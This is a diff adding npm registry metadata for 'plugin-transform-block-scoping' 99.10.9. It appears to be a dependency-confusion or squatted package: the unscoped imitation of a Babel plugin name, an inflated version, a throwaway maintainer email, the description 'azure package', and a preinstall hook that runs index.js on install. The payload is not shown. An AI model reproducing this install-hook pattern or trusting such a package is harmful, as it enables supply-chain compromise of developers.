@@ -1,0 +1,62 @@
+{
+    "_id": "plugin-transform-block-scoping",
+    "name": "plugin-transform-block-scoping",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "plugin-transform-block-scoping",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "plugin-transform-block-scoping@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-enowpSQ5TafINiLYh0g3ib8Rg71MjU3XC5SqIi6GQ4KQzjJgIJ89iIwVV/5F1VWbVnuj4Nu1dRKhhkZ8YrBi+Q==",
+                "shasum": "087176ac21ce4b081166c520f1c363b0ede55ded",
+                "tarball": "https://registry.npmjs.org/plugin-transform-block-scoping/-/plugin-transform-block-scoping-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5082,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO4axACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpr1w//dO7q8+FKWf/GJ2uTseEXgK/cBBZ1Ubsf6YS61zCZG57sdCtd\r\nrG4EeHoTLpxqklKLdbbmPOiAAtT4TvULqrfHClktSMGi88EOBrQtKAGqVZmN\r\n1rDprmFFC/x88NjjS0RqupV6s5nxb89NKoxNOyWvacGqVo8rBBqCX0BlpTNz\r\n8W2JJaZXHOgSfCGLn/THsFvBz/QzYnEfnLGOZc8fWF+dVI8fa3H5bpWeTvmH\r\n04yf4RE59hc2Cwk1hOG+r5UjtCIa7YXHzQT62pnlauMmrJSEjwNEDuD6w2c1\r\nQknYIZ+rxOZ5dxJ0AUJU73aw0DoafoI4gwlE1J9SBujz1nztUqMpNC2BPcrk\r\nJca7XuKaEWFh5LBBE7M7Jh1vuR4n/rfcIScY6tExMnDIUlizL77q7ml6XRX9\r\nDXxTK7vGS6M1O9lokeYaZcKKmNW6/RrZD3Z7KW5hNLkKrJNjuQzaZ8RO6yfh\r\nFq9ajpz4YV5rnZX1YJzmV8SNQzGly7ZnJJbVDH+0eZ5NIP7oJQ6V9Aq4N3fI\r\nP0ZtUDIPiFvBV+ywZPTeTGwUpKQZM2ozJCTUw2Ud0lEEdJL6iroupsPzfzEQ\r\nvhyYZ78we6kf3ARJTsNVVmn++DCds2NSkCnBx2Oezruy2rNGe47CxS9y0Zx3\r\ncCZooh1JZlKOFsrytZBSkarRAgBEJv5/pbQ=\r\n=IWCN\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "mc4awfyg",
+                "email": "mc4awfyg@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "mc4awfyg",
+                    "email": "mc4awfyg@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/plugin-transform-block-scoping_99.10.9_1648068273488_0.5678488794088172"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T20:44:33.488Z",
+        "99.10.9": "2022-03-23T20:44:33.568Z",
+        "modified": "2022-03-23T20:44:33.661Z"
+    },
+    "maintainers": [
+        {
+            "name": "mc4awfyg",
+            "email": "mc4awfyg@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
